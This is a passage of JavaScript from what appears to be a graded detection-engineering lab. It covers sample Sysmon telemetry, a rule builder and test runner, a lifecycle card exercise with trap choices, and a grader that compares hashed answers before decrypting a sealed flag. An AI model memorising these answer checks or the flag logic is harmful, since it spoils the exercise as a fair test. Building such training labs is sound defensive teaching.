        R('S37', '2026-10-14 10:31:48.302', 'srv03', 'CBX\\j.okoro_adm', P.cu, 'CertUtil.exe', 'certutil -addstore -f Root C:\\Certs\\cbx-root-2026.cer', P.ps, 'High'),
        R('S38', '2026-10-14 15:09:02.687', 'ws19', 'CBX\\d.ferreira', P.ipc, 'ipconfig.exe', 'ipconfig /renew', P.cmd, 'Medium')
    ];
    var byTime = function (a, b) { return a.UtcTime < b.UtcTime ? -1 : a.UtcTime > b.UtcTime ? 1 : 0; };
    TEST.sort(byTime); SHADOW.sort(byTime);
    var INVENTORY = [
        ['ws11.cbx.lab', '10.63.20.11', 'Windows 11 Enterprise 24H2', 'OS build 26100.8875 (KB5101650, July 2026 security update), Sysmon v15.15 (schema 4.90), PkgRelay agent'],
        ['ws14.cbx.lab', '10.63.20.14', 'Windows 11 Enterprise 24H2', 'OS build 26100.8875 (KB5101650), Sysmon v15.15, PkgRelay agent'],
        ['ws19.cbx.lab', '10.63.20.19', 'Windows 11 Enterprise 24H2', 'OS build 26100.8875 (KB5101650), Sysmon v15.15, PkgRelay agent'],
        ['ws24.cbx.lab', '10.63.20.24', 'Windows 11 Enterprise 24H2', 'OS build 26100.8875 (KB5101650), Sysmon v15.15, PkgRelay agent'],
        ['ws27.cbx.lab', '10.63.20.27', 'Windows 11 Enterprise 24H2', 'OS build 26100.8875 (KB5101650), Sysmon v15.15, PkgRelay agent'],
        ['ws33.cbx.lab', '10.63.20.33', 'Windows 11 Enterprise 24H2', 'OS build 26100.8875 (KB5101650), Sysmon v15.15, PkgRelay agent'],
        ['ws45.cbx.lab', '10.63.90.45', 'Windows 11 Enterprise 24H2', 'OS build 26100.8875 (KB5101650), Sysmon v15.15 (exercise host, no PkgRelay agent)'],
        ['srv03.cbx.lab', '10.63.10.3', 'Windows Server 2022 Datacenter', 'OS build 20348.5622 (KB5122882, September 2026), Sysmon v15.15'],
        ['srv05.cbx.lab', '10.63.10.5', 'Windows Server 2022 Datacenter', 'OS build 20348.5622 (KB5122882), IIS 10 hosting the internal package mirror at http://srv05.cbx.lab/pkg/, Sysmon v15.15'],
        ['srv08.cbx.lab', '10.63.10.8', 'Windows Server 2022 Datacenter', 'OS build 20348.5622 (KB5122882), Sysmon v15.15'],
        ['srv12.cbx.lab', '10.63.90.12', 'Windows Server 2022 Datacenter', 'OS build 20348.5622 (KB5122882), Sysmon v15.15 (exercise host)']
    ];
    var FIELDS = ['Computer', 'User', 'Image', 'OriginalFileName', 'CommandLine', 'ParentImage', 'IntegrityLevel'];
    var OPS = ['equals', 'contains', 'starts with', 'ends with'];
    var TEL_COLS = ['UtcTime', 'Computer', 'User', 'Image', 'OriginalFileName', 'CommandLine', 'ParentImage', 'IntegrityLevel'];
    var SHADOW_COLS = ['UtcTime', 'Computer', 'User', 'Image', 'CommandLine', 'ParentImage'];
    var WRAP = { CommandLine: 1, Image: 0 };

    var LAB_DATA = {
        cards: [
            { id: 'c1', text: 'Record REQ-0412: behaviour, scope and ATT&CK technique' },
            { id: 'c2', text: 'Write the DET-0217 spec with test cases and expected results' },
            { id: 'c3', text: 'Build the rule logic in the workbench' },
            { id: 'c4', text: 'Run the test suite until every test case passes' },
            { id: 'c5', text: 'Deploy version 1.0.0 in shadow mode for 7 days' },
            { id: 'c6', text: 'Add a narrow exclusion for the explained shadow false positives' },
            { id: 'c7', text: 'Raise the version and write the changelog entry' },
            { id: 'c8', text: 'Re-run the full test suite on the new version' },
            { id: 'c9', text: 'Promote to production with owner and response notes' },
            { id: 't1', text: 'Deploy version 1.0.0 straight to production alerting' },
            { id: 't2', text: 'Delete the failing test case so the suite passes' },
            { id: 't3', text: 'Exclude every event where User is NT AUTHORITY\\SYSTEM' },
            { id: 't4', text: 'Edit the production rule in place without changing the version' },
            { id: 't5', text: 'Build the logic first, then choose test cases it already passes' }
        ],
        // graded order: cards inside one step may be in any order
        steps: [['c1'], ['c2'], ['c3'], ['c4'], ['c5'], ['c6', 'c7'], ['c8'], ['c9']],
        traps: ['t1', 't2', 't3', 't4', 't5'],
        consequence: {
            t1: 'Analysts now receive alerts from a rule that has never run on live telemetry.',
            t2: 'The suite no longer covers that variant of the behaviour.',
            t3: 'Everything running as SYSTEM is now invisible to this rule, including scheduled tasks.',
            t4: 'The change has no record and no version to roll back to.',
            t5: 'The tests now describe the rule instead of the requirement.'
        }
    };
    var CHECK_HASH = 'e2b49af7db537';
    var SEALED_FLAG_HEX = '9e1e94597a99f05a0c039eac7ab8c5411fed92f73a06';
    var RULE_CHECK = '17ef4fdb66c02e';
    var TUTORIAL_KEY = 'detection_engineering_lifecycle_tutorial_seen';
    var TUTORIAL = [
        { sel: '#page-header', t: 'Welcome to the workbench', x: 'This workbench takes one detection, DET-0217, through its whole lifecycle. Use Next to walk through each area, Skip to close this tour, and View Tutorial to open it again at any time.' },
        { sel: '#mission-brief', t: 'Mission briefing', x: 'The briefing sets the scene: the purple team finding, the 10-event test capture and the 7-day shadow week you will replay after deploying. Read it first.' },
        { sel: '#status-bar', t: 'Status bar', x: 'The status bar shows the detection version and status. It starts at 0.1.0 Draft. Deploying, writing changelog entries and promoting change what it shows.' },
        { sel: '#tabs', t: 'Workbench tabs', x: 'The work is split into five tabs. Move between them freely; nothing you enter is lost when you switch.' },
        { sel: '#req-card', tab: 'tab-spec', t: 'Requirement', x: 'REQ-0412 says what must be detected and what is out of scope. Every expected result you set should follow from this text.' },
        { sel: '#spec-form', tab: 'tab-spec', t: 'Spec form', x: 'Give the detection a title, tag the ATT&CK technique and choose the data source. The test runner only loads the test capture for a data source that holds it.' },
        { sel: '#testcase-card', tab: 'tab-spec', t: 'Test cases', x: 'Set Alert or No alert for each of the 10 test cases before you build anything. The runner refuses to run until every case has a value and the suite has both kinds.' },
        { sel: '#telemetry-card', tab: 'tab-telemetry', t: 'Telemetry viewer', x: 'Read the raw Sysmon fields for every event. Switch between the test capture and the shadow week (unlocked after the first deploy), filter on any field and page through every row.' },
        { sel: '#rule-card', tab: 'tab-rule', t: 'Rule builder', x: 'Add conditions as field, operator and value. All conditions must match. Exclusion blocks suppress an event that matches every row of one block.' },
        { sel: '#runner-card', tab: 'tab-rule', t: 'Test runner', x: 'Run tests compares each result with the expected value you set and reports Suite passed or Suite failed. Any rule edit clears the last result.' },
        { sel: '#deploy-card', tab: 'tab-deploy', t: 'Deploy and tune', x: 'Deploy to shadow mode once the suite passes. Review the shadow matches, re-run the shadow week after every rule edit, and promote when the latest run passed.' },
        { sel: '#changelog-card', tab: 'tab-deploy', t: 'Changelog', x: 'Record each change with its version, change type, summary and reason. The workbench records what you type and never checks or suggests a version.' },
        { sel: '#record-card', tab: 'tab-record', t: 'Lifecycle record', x: 'Click the cards in the order the work should happen. Some cards do not belong in a sound lifecycle.' },
        { sel: '#submit-card', t: 'Submit', x: 'Enter the three proof values and submit. The flag appears only when the proof, the lifecycle record and your current rule are all right. Reset clears the record, the proof fields and the flag.' }
    ];

    // ===== FLAG SEAL (do not edit) =====
    function cyrb53(str, seed) {
        var h1 = 0xdeadbeef ^ seed, h2 = 0x41c6ce57 ^ seed;
        for (var i = 0; i < str.length; i++) {
            var ch = str.charCodeAt(i);
            h1 = Math.imul(h1 ^ ch, 2654435761); h2 = Math.imul(h2 ^ ch, 1597334677);
        }
        h1 = Math.imul(h1 ^ (h1 >>> 16), 2246822507) ^ Math.imul(h2 ^ (h2 >>> 13), 3266489909);
        h2 = Math.imul(h2 ^ (h2 >>> 16), 2246822507) ^ Math.imul(h1 ^ (h1 >>> 13), 3266489909);
        return 4294967296 * (2097151 & h2) + (h1 >>> 0);
    }
    function norm(s) { return String(s).trim().toLowerCase().split(/\s+/).join(' '); }
    function unseal(hex, key) {
        var out = '';
        for (var i = 0; i < hex.length; i += 2) {
            out += String.fromCharCode(parseInt(hex.substr(i, 2), 16) ^ (cyrb53(key, i / 2) % 256));
        }
        return out;
    }

    // ===== HELPERS =====
    function esc(s) { return String(s).replace(/[&<>"]/g, function (c) { return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]; }); }
    function el(tag, attrs, text) {
        var e = document.createElement(tag);
        if (attrs) Object.keys(attrs).forEach(function (k) { if (k === 'className') e.className = attrs[k]; else e.setAttribute(k, attrs[k]); });
        if (text !== undefined) e.textContent = text;
        return e;
    }

    // Paginated table: rows sorted by time, 10 per page, first/previous/next/last, never capped.
    var PAGE = 10;
    function renderPaged(container, rows, cols, state, idLabel) {
        var pages = Math.max(1, Math.ceil(rows.length / PAGE));
        if (state.page >= pages) state.page = pages - 1;
        if (state.page < 0) state.page = 0;
        var slice = rows.slice(state.page * PAGE, state.page * PAGE + PAGE);
        var html = '<div class="tbl-wrap"><table class="data"><thead><tr><th>' + esc(idLabel) + '</th>';
        cols.forEach(function (c) { html += '<th>' + esc(c) + '</th>'; });
        html += '</tr></thead><tbody>';
        if (!slice.length) html += '<tr><td colspan="' + (cols.length + 1) + '">No rows</td></tr>';
        slice.forEach(function (r) {
            html += '<tr><td>' + esc(r.id) + '</td>';
            cols.forEach(function (c) { html += '<td' + (WRAP[c] ? ' class="wrapcell"' : '') + '>' + esc(r[c]) + '</td>'; });
            html += '</tr>';
        });
        html += '</tbody></table></div>';
        html += '<div class="pager"><button type="button" class="btn btn-small" data-pg="first">First</button>' +
            '<button type="button" class="btn btn-small" data-pg="prev">Previous</button>' +
            '<button type="button" class="btn btn-small" data-pg="next">Next page</button>' +
            '<button type="button" class="btn btn-small" data-pg="last">Last</button>' +
            '<span class="info">Page ' + (state.page + 1) + ' of ' + pages + ', ' + rows.length + ' rows</span></div>';
        container.innerHTML = html;
        var btns = container.querySelectorAll('[data-pg]');
        Array.prototype.forEach.call(btns, function (b) {
            var k = b.getAttribute('data-pg');
            if ((k === 'first' || k === 'prev') && state.page === 0) b.disabled = true;
            if ((k === 'next' || k === 'last') && state.page >= pages - 1) b.disabled = true;
            b.addEventListener('click', function () {
                if (k === 'first') state.page = 0;
                if (k === 'prev') state.page--;
                if (k === 'next') state.page++;
                if (k === 'last') state.page = pages - 1;
                renderPaged(container, rows, cols, state, idLabel);
            });
        });
    }

    // ===== TABS =====
    var tabs = document.querySelectorAll('.tab');
    function activateTab(id) {
        Array.prototype.forEach.call(tabs, function (t) {
            var on = t.id === id;
            t.classList.toggle('active', on);
            $(t.getAttribute('data-panel')).classList.toggle('active', on);
        });
    }
    function activeTab() { var a = document.querySelector('.tab.active'); return a ? a.id : 'tab-spec'; }
    Array.prototype.forEach.call(tabs, function (t) { t.addEventListener('click', function () { activateTab(t.id); }); });

    // ===== STATE =====
    var state = {
        expected: {}, source: '',
        conds: [], excl: [],
        ruleRev: 0, suiteRev: 0, lastTest: null,
        deployed: false, shadowRev: -1, shadowMatches: null,
        version: '0.1.0', status: 'Draft', changelog: []
    };
    function updateStatus() { $('st-version').textContent = state.version; $('st-status').textContent = state.status; }

    // ===== INVENTORY AND TEST CASE TABLE =====
    (function () {
        var h = '<thead><tr><th>Hostname</th><th>IP</th><th>OS</th><th>Build / patch level</th></tr></thead><tbody>';
        INVENTORY.forEach(function (r) { h += '<tr><td>' + esc(r[0]) + '</td><td>' + esc(r[1]) + '</td><td>' + esc(r[2]) + '</td><td class="wrapcell">' + esc(r[3]) + '</td></tr>'; });
        $('inv-table').innerHTML = h + '</tbody>';
        var t = '<thead><tr><th>ID</th><th>Expected</th><th>UtcTime</th><th>Computer</th><th>CommandLine</th></tr></thead><tbody>';
        TEST.forEach(function (r) {
            t += '<tr><td>' + esc(r.id) + '</td>' +
                '<td><select class="sel" id="exp-' + r.id + '" data-tc="' + r.id + '" aria-label="Expected result for ' + r.id + '"><option value=""></option><option value="Alert">Alert</option><option value="No alert">No alert</option></select></td>' +
                '<td>' + esc(r.UtcTime) + '</td><td>' + esc(r.Computer) + '</td><td class="wrapcell">' + esc(r.CommandLine) + '</td></tr>';
        });
        $('tc-table').innerHTML = t + '</tbody>';
        TEST.forEach(function (r) {
            $('exp-' + r.id).addEventListener('change', function (e) { state.expected[r.id] = e.target.value; suiteChanged(); });
        });
    })();
    $('spec-source').addEventListener('change', function (e) { state.source = e.target.value; suiteChanged(); });

    // ===== TELEMETRY VIEWER =====
    var tel = { ds: 'test', page: 0, filter: '' };
    function renderTelemetry() {
        $('ds-test').classList.toggle('btn-primary', tel.ds === 'test');
        $('ds-shadow').classList.toggle('btn-primary', tel.ds === 'shadow');
        $('ds-shadow').textContent = state.deployed ? 'Shadow week (38)' : 'Shadow week (Available after deployment)';
        var body = $('tel-body');
        if (tel.ds === 'shadow' && !state.deployed) {
            body.innerHTML = '<div class="locked">Available after deployment</div>';
            return;
        }
        var src = tel.ds === 'test' ? TEST : SHADOW;
        var f = tel.filter.trim().toLowerCase();
        var rows = f ? src.filter(function (r) { return TEL_COLS.some(function (c) { return String(r[c]).toLowerCase().indexOf(f) !== -1; }); }) : src;
        renderPaged(body, rows, TEL_COLS, tel, tel.ds === 'test' ? 'Test case' : 'Row');
    }
    $('ds-test').addEventListener('click', function () { tel.ds = 'test'; tel.page = 0; renderTelemetry(); });
    $('ds-shadow').addEventListener('click', function () { tel.ds = 'shadow'; tel.page = 0; renderTelemetry(); });
    $('tel-filter').addEventListener('input', function (e) { tel.filter = e.target.value; tel.page = 0; renderTelemetry(); });

    // ===== RULE BUILDER =====
    function newCond() { return { f: FIELDS[0], op: OPS[0], v: '' }; }
    function condRow(c, prefix, onRemove) {
        var row = el('div', { className: 'cond-row' });
        var fs = el('select', { className: 'sel', id: prefix + '-f', 'aria-label': 'Field' });
        FIELDS.forEach(function (f) { var o = el('option', { value: f }, f); if (f === c.f) o.selected = true; fs.appendChild(o); });
        var os = el('select', { className: 'sel', id: prefix + '-op', 'aria-label': 'Operator' });
        OPS.forEach(function (f) { var o = el('option', { value: f }, f); if (f === c.op) o.selected = true; os.appendChild(o); });
        var vi = el('input', { className: 'inp', id: prefix + '-v', type: 'text', autocomplete: 'off', placeholder: 'value', 'aria-label': 'Value' });
        vi.value = c.v;
        var rm = el('button', { className: 'btn btn-small', type: 'button', id: prefix + '-rm' }, 'Remove');
        fs.addEventListener('change', function () { c.f = fs.value; ruleChanged(); });
        os.addEventListener('change', function () { c.op = os.value; ruleChanged(); });
        vi.addEventListener('input', function () { c.v = vi.value; ruleChanged(); });
        rm.addEventListener('click', onRemove);
        row.appendChild(fs); row.appendChild(os); row.appendChild(vi); row.appendChild(rm);
        return row;
    }
    function renderRule() {
        var cl = $('cond-list'); cl.innerHTML = '';
        if (!state.conds.length) cl.appendChild(el('div', { className: 'empty-note' }, 'No conditions yet.'));
        state.conds.forEach(function (c, i) {
            cl.appendChild(condRow(c, 'cond-' + i, function () { state.conds.splice(i, 1); renderRule(); ruleChanged(); }));
        });
        $('btn-add-cond').disabled = state.conds.length >= 6;
        var xl = $('excl-list'); xl.innerHTML = '';
        if (!state.excl.length) xl.appendChild(el('div', { className: 'empty-note' }, 'No exclusions.'));
        state.excl.forEach(function (block, b) {
            var box = el('div', { className: 'excl-block' });
            var head = el('div', { className: 'excl-head' });
            head.appendChild(el('span', null, 'Exclusion block ' + (b + 1) + ' (all rows must match)'));
            var hb = el('div', { className: 'btn-row' }); hb.style.marginTop = '0';
            var add = el('button', { className: 'btn btn-small', type: 'button', id: 'btn-excl-add-row-' + b }, 'Add row');
            add.disabled = block.length >= 3;
            add.addEventListener('click', function () { block.push(newCond()); renderRule(); ruleChanged(); });
            var del = el('button', { className: 'btn btn-small', type: 'button', id: 'btn-excl-del-' + b }, 'Delete block');
            del.addEventListener('click', function () { state.excl.splice(b, 1); renderRule(); ruleChanged(); });
            hb.appendChild(add); hb.appendChild(del); head.appendChild(hb); box.appendChild(head);
            var list = el('div', { className: 'cond-list' });
            block.forEach(function (c, i) {
                list.appendChild(condRow(c, 'excl-' + b + '-' + i, function () {
                    block.splice(i, 1); if (!block.length) state.excl.splice(b, 1); renderRule(); ruleChanged();
                }));
            });
            box.appendChild(list); xl.appendChild(box);
        });
        $('btn-add-excl').disabled = state.excl.length >= 2;
    }
    $('btn-add-cond').addEventListener('click', function () { if (state.conds.length < 6) { state.conds.push(newCond()); renderRule(); ruleChanged(); } });
    $('btn-add-excl').addEventListener('click', function () { if (state.excl.length < 2) { state.excl.push([newCond()]); renderRule(); ruleChanged(); } });

    function condComplete(c) { return c.f && c.op && String(c.v).trim() !== ''; }
    function ruleComplete() {
        return state.conds.length > 0 && state.conds.every(condComplete) &&
            state.excl.every(function (b) { return b.length > 0 && b.every(condComplete); });
    }
    function matchCond(row, c) {
        var fv = String(row[c.f] || '').trim().toLowerCase();
        var v = String(c.v).trim().toLowerCase();
        if (c.op === 'equals') return fv === v;
        if (c.op === 'contains') return fv.indexOf(v) !== -1;
        if (c.op === 'starts with') return fv.slice(0, v.length) === v;
        if (c.op === 'ends with') return v.length <= fv.length && fv.slice(fv.length - v.length) === v;
        return false;
    }
    function fires(row) {
        if (!state.conds.every(function (c) { return matchCond(row, c); })) return false;
        return !state.excl.some(function (b) { return b.every(function (c) { return matchCond(row, c); }); });
    }

    // ===== TEST RUNNER =====
    function testPassedNow() {
        var t = state.lastTest;
        return !!(t && t.passed && t.ruleRev === state.ruleRev && t.suiteRev === state.suiteRev);
    }
    function clearTestResult() { state.lastTest = null; $('test-results').innerHTML = ''; $('test-msg').textContent = ''; }
    function ruleChanged() {
        state.ruleRev++; clearTestResult();
        if (state.deployed) $('deploy-msg').textContent = 'The rule changed since the last shadow run. Re-run the shadow week to refresh the matches.';
        refreshControls();
    }
    function suiteChanged() { state.suiteRev++; clearTestResult(); refreshControls(); }
    function runTests() {
        clearTestResult();
        var msg = $('test-msg');
        var missing = TEST.some(function (r) { return !state.expected[r.id]; });
        var kinds = {}; TEST.forEach(function (r) { if (state.expected[r.id]) kinds[state.expected[r.id]] = 1; });
        if (missing || !kinds['Alert'] || !kinds['No alert']) {
            msg.textContent = 'Every test case needs an expected result, and a suite needs both kinds.';
            refreshControls(); return;
        }
        if (!ruleComplete()) {
            msg.textContent = 'Every condition and exclusion row needs a value, and the rule needs at least one condition.';
            refreshControls(); return;
        }
        if (state.source !== 'sysmon1') {
            msg.textContent = '0 test events for the selected data source';
            $('test-results').innerHTML = '<div class="suite res-fail">Suite failed</div>';
            state.lastTest = { passed: false, ruleRev: state.ruleRev, suiteRev: state.suiteRev };
            refreshControls(); return;
        }
        var allPass = true;
        var h = '<div class="tbl-wrap" style="margin-top:10px"><table class="data"><thead><tr><th>Test case</th><th>Computer</th><th>Expected</th><th>Result</th><th>Pass or Fail</th></tr></thead><tbody>';
        TEST.forEach(function (r) {
            var res = fires(r) ? 'Alert' : 'No alert';
            var ok = res === state.expected[r.id];
            if (!ok) allPass = false;
            h += '<tr><td>' + esc(r.id) + '</td><td>' + esc(r.Computer) + '</td><td>' + esc(state.expected[r.id]) + '</td><td>' +
                (res === 'Alert' ? 'Fired' : 'Silent') + '</td><td class="' + (ok ? 'res-pass' : 'res-fail') + '">' + (ok ? 'Pass' : 'Fail') + '</td></tr>';
        });
        h += '</tbody></table></div><div class="suite ' + (allPass ? 'res-pass' : 'res-fail') + '">' + (allPass ? 'Suite passed' : 'Suite failed') + '</div>';
        msg.textContent = '10 test events loaded from Sysmon Event ID 1.';
        $('test-results').innerHTML = h;
        state.lastTest = { passed: allPass, ruleRev: state.ruleRev, suiteRev: state.suiteRev };
        refreshControls();
    }
    $('btn-run-tests').addEventListener('click', runTests);

    // ===== DEPLOY, SHADOW, PROMOTE =====
    var shadowPage = { page: 0 };
    function runShadow() {
        state.shadowRev = state.ruleRev;
        state.shadowMatches = ruleComplete() ? SHADOW.filter(fires) : [];
        shadowPage.page = 0;
        renderShadow();
    }
    function renderShadow() {
        var box = $('shadow-results');
        if (!state.shadowMatches) { box.innerHTML = ''; return; }
        box.innerHTML = '<div class="section-label" style="margin-top:12px">Shadow results: ' + state.shadowMatches.length + (state.shadowMatches.length === 1 ? ' match' : ' matches') + '</div><div id="shadow-table"></div>';
        renderPaged($('shadow-table'), state.shadowMatches, SHADOW_COLS, shadowPage, 'Row');
    }
    $('btn-deploy').addEventListener('click', function () {
        if (!testPassedNow() || state.deployed) return;
        state.deployed = true; state.version = '1.0.0'; state.status = 'Shadow';
        runShadow();
        $('deploy-msg').textContent = 'Version 1.0.0 deployed to shadow mode. The shadow week has been replayed and the dataset is unlocked in the Telemetry tab.';
        updateStatus(); renderTelemetry(); refreshControls();
    });
    $('btn-rerun-shadow').addEventListener('click', function () {
        if (!state.deployed) return;
        runShadow();
        $('deploy-msg').textContent = 'Shadow week re-run with the current rule.';
        refreshControls();
    });
    $('btn-promote').addEventListener('click', function () {
        if ($('btn-promote').disabled) return;
        state.status = 'Production'; updateStatus();
        $('deploy-msg').textContent = 'DET-0217 promoted to production.';
        refreshControls();
    });
    function refreshControls() {
        $('btn-deploy').disabled = !(testPassedNow() && !state.deployed);
        $('btn-deploy').textContent = state.deployed ? 'Deployed to shadow mode' : 'Deploy to shadow mode';
        $('btn-rerun-shadow').disabled = !state.deployed;
        $('btn-promote').disabled = !(state.deployed && testPassedNow() && state.shadowRev === state.ruleRev && state.status !== 'Production');
    }

    // ===== CHANGELOG =====
    $('btn-add-cl').addEventListener('click', function () {
        var v = $('cl-version').value.trim();
        var typeEl = document.querySelector('input[name="cl-type"]:checked');
        if (!v || !typeEl) { $('cl-msg').textContent = 'Enter a version and choose a change type.'; return; }
        var entry = { date: $('cl-date').value.trim(), version: v, type: typeEl.value, summary: $('cl-summary').value.trim(), reason: $('cl-reason').value.trim() };
        state.changelog.push(entry);
        state.version = v; updateStatus();
        var li = el('li');
        li.innerHTML = '<b>' + esc(entry.date) + '  ' + esc(entry.version) + '  ' + esc(entry.type) + '</b><br>' + esc(entry.summary) + (entry.reason ? '<br>Reason: ' + esc(entry.reason) : '');
        $('cl-list').appendChild(li);
        $('cl-msg').textContent = 'Entry recorded.';
        $('cl-version').value = ''; $('cl-summary').value = ''; $('cl-reason').value = '';
        typeEl.checked = false;
    });

    // ===== LIFECYCLE RECORD =====
    var plan = [];
    function shuffle(a) { for (var i = a.length - 1; i > 0; i--) { var j = Math.floor(Math.random() * (i + 1)); var t = a[i]; a[i] = a[j]; a[j] = t; } return a; }
    function log(msg, cls) { var li = document.createElement('li'); li.textContent = msg; if (cls) li.className = cls; $('log').appendChild(li); }
    function renderDeck() {
        var deck = $('deck'); deck.innerHTML = '';
        shuffle(LAB_DATA.cards.slice()).forEach(function (c) {
            var b = document.createElement('button');
            b.type = 'button'; b.className = 'action-card'; b.textContent = c.text; b.setAttribute('data-id', c.id);
            b.addEventListener('click', function () {
                if (plan.indexOf(c.id) !== -1) return;
                plan.push(c.id); b.classList.add('chosen'); log(plan.length + '. ' + c.text);
                if (LAB_DATA.consequence[c.id]) log(LAB_DATA.consequence[c.id], 'bad');
            });
            deck.appendChild(b);
        });
    }
    function planIsValid() {
        if (plan.some(function (id) { return LAB_DATA.traps.indexOf(id) !== -1; })) return false;
        var flat = []; LAB_DATA.steps.forEach(function (s) { flat = flat.concat(s); });
        if (plan.length !== flat.length) return false;
        var pos = 0;
        for (var s = 0; s < LAB_DATA.steps.length; s++) {
            var chunk = plan.slice(pos, pos + LAB_DATA.steps[s].length);
            if (!LAB_DATA.steps[s].every(function (id) { return chunk.indexOf(id) !== -1; })) return false;
            pos += LAB_DATA.steps[s].length;
        }
        return true;
    }

    // ===== RULE CHECK: fired ids on both datasets, hashed (no plain list in source) =====
    function ruleCheck() {
        if (!ruleComplete()) return false;
        var t = TEST.filter(fires).map(function (r) { return r.id; }).sort();
        var s = SHADOW.filter(fires).map(function (r) { return r.id; }).sort();
        return cyrb53(t.join(',') + '|' + s.join(','), 11).toString(16) === RULE_CHECK;
    }

    // ===== SUBMIT AND RESET =====
    function reset() {
        plan = []; $('log').innerHTML = ''; $('feedback').textContent = '';
        $('ans-1').value = ''; $('ans-2').value = ''; $('ans-3').value = '';
        $('flag-area').classList.remove('show'); $('flag-output').textContent = '';
        renderDeck();
    }
    function submit() {
        var key = [norm($('ans-1').value), norm($('ans-2').value), norm($('ans-3').value)].join('|');
        var ok = cyrb53(key, 7).toString(16) === CHECK_HASH && planIsValid() && ruleCheck();
        $('flag-area').classList.remove('show'); $('flag-output').textContent = '';
        if (!ok) { $('feedback').textContent = 'Not yet.'; $('feedback').style.color = 'var(--error)'; return; }
        $('feedback').textContent = 'Accepted.'; $('feedback').style.color = 'var(--success)';
        $('flag-output').textContent = unseal(SEALED_FLAG_HEX, key); $('flag-area').classList.add('show');
    }
    $('btn-submit').addEventListener('click', submit);
    $('btn-reset').addEventListener('click', reset);

    // ===== TUTORIAL (spotlight tour) =====
    var tStep = 0, tutOpen = false, tabBefore = null;
    function placeTut() {
        if (!tutOpen) return;
        var step = TUTORIAL[tStep];
        var target = document.querySelector(step.sel);
        var spot = $('tutorial-spotlight'), box = $('tutorial-box');
        var vw = window.innerWidth, vh = window.innerHeight, m = 12;
        var r = target.getBoundingClientRect();
        var pad = 6;
        var top = Math.max(4, r.top - pad), left = Math.max(4, r.left - pad);
        var bottom = Math.min(vh - 4, r.bottom + pad), right = Math.min(vw - 4, r.right + pad);
        spot.style.top = top + 'px'; spot.style.left = left + 'px';
        spot.style.width = Math.max(0, right - left) + 'px'; spot.style.height = Math.max(0, bottom - top) + 'px';
        var bw = Math.min(380, vw - 2 * m);
        box.style.width = bw + 'px';
        var bh = box.offsetHeight;
        var bt, bl;
        if (vw < 700) {
            bl = m; box.style.width = (vw - 2 * m) + 'px'; bh = box.offsetHeight;
            // bottom by default; move to the top when that hides less of the highlighted area
            var overlapBottom = Math.max(0, bottom - (vh - bh - m));
            var overlapTop = Math.max(0, (bh + m) - top);
            bt = overlapTop < overlapBottom ? m : vh - bh - m;
        } else if (bottom + m + bh <= vh - m) {
            bt = bottom + m; bl = Math.min(Math.max(m, left), vw - bw - m);
        } else if (top - m - bh >= m) {
            bt = top - m - bh; bl = Math.min(Math.max(m, left), vw - bw - m);
        } else if (right + m + bw <= vw - m) {
            bl = right + m; bt = Math.min(Math.max(m, top), vh - bh - m);
        } else if (left - m - bw >= m) {
            bl = left - m - bw; bt = Math.min(Math.max(m, top), vh - bh - m);
        } else {
            bl = vw - bw - m; bt = vh - bh - m;
        }
        box.style.left = Math.max(m, bl) + 'px'; box.style.top = Math.max(m, bt) + 'px';
    }
    function scrollToTarget() {
        var step = TUTORIAL[tStep];
        var target = document.querySelector(step.sel);
        var r = target.getBoundingClientRect();
        var narrow = window.innerWidth < 700;
        var y = window.pageYOffset + r.top - (narrow ? 12 : 90);
        window.scrollTo(0, Math.max(0, y));
    }
    function drawTut() {
        var step = TUTORIAL[tStep];
        if (step.tab) activateTab(step.tab);
        $('tut-step').textContent = 'Step ' + (tStep + 1) + ' of ' + TUTORIAL.length;
        $('tut-title').textContent = step.t; $('tut-text').textContent = step.x;
        $('tut-prev').disabled = tStep === 0;
        $('tut-next').textContent = tStep === TUTORIAL.length - 1 ? 'Finish' : 'Next';
        scrollToTarget();
        placeTut();
    }
    function showTut(on) {
        if (on === tutOpen) { if (on) drawTut(); return; }
        tutOpen = on;
        document.documentElement.classList.toggle('scroll-locked', on);
        document.body.classList.toggle('scroll-locked', on);
        document.body.classList.toggle('guide-open', on);
        if (on) { tabBefore = activeTab(); drawTut(); }
        else {
            try { localStorage.setItem(TUTORIAL_KEY, '1'); } catch (e) {}
            if (tabBefore) activateTab(tabBefore);
            window.scrollTo(0, 0);
        }
    }
    $('tut-prev').addEventListener('click', function (e) { e.stopPropagation(); if (tStep > 0) { tStep--; drawTut(); } });
    $('tut-next').addEventListener('click', function (e) { e.stopPropagation(); if (tStep < TUTORIAL.length - 1) { tStep++; drawTut(); } else showTut(false); });
    $('tut-skip').addEventListener('click', function (e) { e.stopPropagation(); e.preventDefault(); showTut(false); });
    $('tutorial-overlay').addEventListener('click', function (e) { e.stopPropagation(); e.preventDefault(); });
    $('btn-tutorial').addEventListener('click', function () { tStep = 0; showTut(true); });
    document.addEventListener('keydown', function (e) { if (e.key === 'Escape' && tutOpen) showTut(false); });
    window.addEventListener('resize', placeTut);
    window.addEventListener('scroll', placeTut, true);

    // ===== INIT =====
    renderRule(); renderTelemetry(); renderDeck(); updateStatus(); refreshControls();
    var seen = false; try { seen = localStorage.getItem(TUTORIAL_KEY) === '1'; } catch (e) {}
    if (!seen) showTut(true);
})();
</script>
</body>
</html>
